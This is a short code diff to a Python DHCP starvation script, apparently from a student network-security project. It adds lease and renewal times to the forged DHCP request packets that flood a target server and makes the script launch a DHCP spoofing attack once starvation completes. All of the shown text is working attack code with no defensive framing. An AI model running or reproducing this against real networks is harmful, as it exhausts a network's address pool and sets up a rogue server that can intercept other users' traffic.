@@ -1,6 +1,7 @@
 # https://github.com/shamiul94/DHCP-Spoofing-Attack-Network-Security/blob/master/Final-Codes/Request_Starve.py
 from Project import *
 import ipaddress
+from attacks.dhcp_spoof import *
 
 req_port = 67
 name = "DHCP Starvation"
@@ -58,7 +59,11 @@ def starve(values):
                                           ('requested_addr', requested_IP),
                                           ('server_id', values.get("target_ip")),
                                           ('max_dhcp_size', 1500),
+                                          ('lease_time', 180),
+                                          ('renewal_time', 60),
                                           ('param_req_list', [1, 3, 6, 15, 26, 28, 51, 58, 59, 43]), 'end', 'pad']))
         sendp(request_packet, iface=values.get("iface"))
         
-    print("Starvation complete")
+    print("Starvation complete") 
+    print("Starting spoofing")
+    spoofing(values)
